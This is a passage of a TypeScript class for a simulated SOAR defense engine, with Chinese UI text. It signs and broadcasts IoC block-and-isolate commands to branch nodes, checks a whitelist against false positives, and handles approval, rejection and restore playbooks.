        description: `特徵封裝為 OASIS STIX 2.1 標準威脅格式，附帶節點證書簽名，藉由雙向 mTLS gRPC 通道傳回總部。`,
        status: 'Completed'
      },
      {
        step: 5,
        title: '防誤報審查與雙軌模式派送 (False-Positive & SOAR Dual-Track)',
        node: 'Command Node 安全決策腦',
        timestamp: new Date().toISOString(),
        description: this.config.soarMode === 'MANUAL_ATTENDED'
          ? `通過核心白名單校驗，評分 ${scoreCalc.totalScore} >= 90 分。目前處於【手動/審核模式】，已發送 Slack/Teams 彈窗並啟動 5 分鐘 SLA 倒數，等待 SOC 人員一鍵核准！`
          : `通過核心白名單校驗，評分 ${scoreCalc.totalScore} >= 90 分。目前處於【全自動模式】，SOAR 引擎直接簽名廣播全網阻斷！`,
        status: 'ReadyForDispatch'
      }
    ];

    return {
      success: true,
      ioc: newIoc,
      workflowSteps,
      pendingApproval
    };
  }

  // Execute SOAR Automated Defense Broadcast to All Nodes
  public executeSoarBroadcast(params: {
    iocId: string;
    dryRun?: boolean;
    operator?: string;
  }): {
    success: boolean;
    auditRecord: DispatchAuditRecord;
    stixPackage: Stix21Package;
    targetNodes: { id: string; name: string; status: string; latency: number }[];
    commandSignatureHex: string;
    webhookPayload: any;
  } {
    const ioc = this.iocInventory.find(i => i.id === params.iocId);
    if (!ioc) {
      throw new Error(`找不到指定的 IoC: ${params.iocId}`);
    }

    // False positive guard
    const wlCheck = this.checkDynamicWhitelist(ioc.value);
    if (wlCheck.isWhitelisted && !params.dryRun) {
      throw new Error(`【防誤報阻斷觸發】此特徵命中企業核心白名單 (${wlCheck.reason})，Command Node 拒絕下發鎖死正常流量！`);
    }

    const commandId = `CMD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
    const nonce = crypto.randomBytes(8).toString('hex');
    const timestamp = Date.now();
    const ttlSeconds = this.config.quarantineTtlHours * 3600;
    const targetNodeIds = this.branchNodes.map(n => n.id);

    // Cryptographic signature generation
    const { signature } = this.signDispatchPayload({
      commandId,
      timestamp,
      nonce,
      action: 'BLOCK_AND_ISOLATE',
      targetIoc: ioc.value,
      targetNodes: targetNodeIds,
      ttlSeconds
    });

    const isDryRun = params.dryRun ?? false;
    const simulatedTrafficImpact = wlCheck.isWhitelisted ? 3840 : Math.floor(Math.random() * 4);

    const auditRecord: DispatchAuditRecord = {
      id: commandId,
      timestamp: new Date().toISOString(),
      sourceIoCId: ioc.id,
      targetScope: 'GLOBAL',
      affectedNodes: targetNodeIds,
      signature: signature,
      signatureAlgorithm: 'HMAC-SHA256',
      nonce: nonce,
      ttlSeconds: ttlSeconds,
      dryRun: isDryRun,
      impactTrafficHits24h: simulatedTrafficImpact,
      operator: params.operator || 'SOAR-AutoPlaybook-v4',
      status: isDryRun ? 'Simulated' : 'Success',
      enforcementDetails: {
        firewallRulesPushed: targetNodeIds.length * 2,
        edrPoliciesUpdated: targetNodeIds.length,
        switchAclsGenerated: targetNodeIds.length,
        dagGroupName: 'DAG_CRITICAL_MALICIOUS_IPS'
      }
    };

    if (!isDryRun) {
      ioc.status = 'Broadcasted';
      this.branchNodes.forEach(node => {
        node.activeBlockRulesCount += 1;
        node.status = 'Synchronized';
        node.lastSyncTime = new Date().toISOString();
      });

      // Update pending approval status if exists
      const appr = this.pendingApprovals.find(a => a.iocId === ioc.id);
      if (appr) {
        appr.status = 'APPROVED';
        appr.decidedBy = params.operator || 'SOC-Operator';
        appr.decidedAt = new Date().toISOString();
      }
    }

    this.auditLog.unshift(auditRecord);
    const stixPackage = this.buildStixPackage(ioc);
    const webhookPayload = this.buildSoarWebhookPayload(ioc, ioc.scoreBreakdown?.totalScore || 95, this.config.soarMode);

    return {
      success: true,
      auditRecord,
      stixPackage,
      targetNodes: this.branchNodes.map(n => ({
        id: n.id,
        name: n.name,
        status: isDryRun ? 'DryRun-Verified' : 'Enforced (DAG Pushed)',
        latency: n.latencyMs
      })),
      commandSignatureHex: signature,
      webhookPayload
    };
  }

  // Restore / Un-isolate containment action (Reversal Playbook)
  public executeRestoreAction(params: {
    approvalId?: string;
    iocId?: string;
    operator?: string;
  }): { success: boolean; message: string; restoredIoC: string; restoredNodes: string[] } {
    let targetIocVal = '';
    let targetIocObj: ExtractedIoC | undefined;

    if (params.approvalId) {
      const appr = this.pendingApprovals.find(a => a.id === params.approvalId);
      if (appr) {
        appr.status = 'RESTORED';
        appr.decidedBy = params.operator || 'SOC-Admin';
        appr.decidedAt = new Date().toISOString();
        targetIocVal = appr.iocValue;
        targetIocObj = this.iocInventory.find(i => i.id === appr.iocId);
      }
    } else if (params.iocId) {
      targetIocObj = this.iocInventory.find(i => i.id === params.iocId);
      if (targetIocObj) {
        targetIocVal = targetIocObj.value;
      }
    }

    if (targetIocObj) {
      targetIocObj.status = 'Restored';
    }

    // Decrement rules on each node
    this.branchNodes.forEach(node => {
      if (node.activeBlockRulesCount > 400) {
        node.activeBlockRulesCount -= 1;
      }
    });

    const auditRestore: DispatchAuditRecord = {
      id: `CMD-RESTORE-${Date.now()}`,
      timestamp: new Date().toISOString(),
      sourceIoCId: targetIocObj?.id || 'ioc-restored',
      targetScope: 'GLOBAL',
      affectedNodes: this.branchNodes.map(n => n.id),
      signature: 'VALIDATED_RESTORE_SIG',
      signatureAlgorithm: 'Ed25519',
      nonce: crypto.randomBytes(6).toString('hex'),
      ttlSeconds: 0,
      dryRun: false,
      impactTrafficHits24h: 0,
      operator: params.operator || 'SOC-Lead-Admin',
      status: 'Restored',
      enforcementDetails: {
        firewallRulesPushed: 0,
        edrPoliciesUpdated: 0,
        switchAclsGenerated: 0,
        dagGroupName: 'DAG_CRITICAL_MALICIOUS_IPS (Removed)'
      }
    };
    this.auditLog.unshift(auditRestore);

    return {
      success: true,
      message: `已成功執行【解隔離復原劇本 (Restore Playbook)】！特徵 ${targetIocVal} 已自全網 Palo Alto DAG 動態群組、FortiGate 及 CrowdStrike EDR 白名單移除，受害主機網路隔離已解除。`,
      restoredIoC: targetIocVal,
      restoredNodes: this.branchNodes.map(n => n.name)
    };
  }

  // Reject a pending approval
  public rejectPendingApproval(id: string, reason: string, operator: string) {
    const appr = this.pendingApprovals.find(a => a.id === id);
    if (!appr) {
      throw new Error(`找不到審批項目: ${id}`);
    }
    appr.status = 'REJECTED';
    appr.decidedBy = operator || 'SOC-Operator';
    appr.decidedAt = new Date().toISOString();
    appr.rejectionReason = reason;
    return appr;
  }

  // Get current architecture state
  public getArchitectureState() {
    return {
      commandNode: this.branchNodes.find(n => n.role === 'HQ-Command'),
      branchNodes: this.branchNodes,
      totalBranchCount: this.branchNodes.length,
      activeThreatCount: this.iocInventory.length,
      broadcastedCount: this.iocInventory.filter(i => i.status === 'Broadcasted').length,
      policyConfig: this.config,
      recentDispatches: this.auditLog.slice(0, 10),
      pendingApprovals: this.pendingApprovals,
      whitelistRules: this.whitelistRules,
      timestamp: new Date().toISOString()
    };
  }

  public getIocList() {
    return this.iocInventory;
  }

  public getWhitelistRules() {
    return this.whitelistRules;
  }

  public getPendingApprovals() {
    return this.pendingApprovals;
  }

  public updatePolicyConfig(newConfig: Partial<SecurityPolicyConfig>) {
    this.config = { ...this.config, ...newConfig };
    return this.config;
  }
}

export const globalActiveDefenseEngine = new ActiveDefenseEngine();
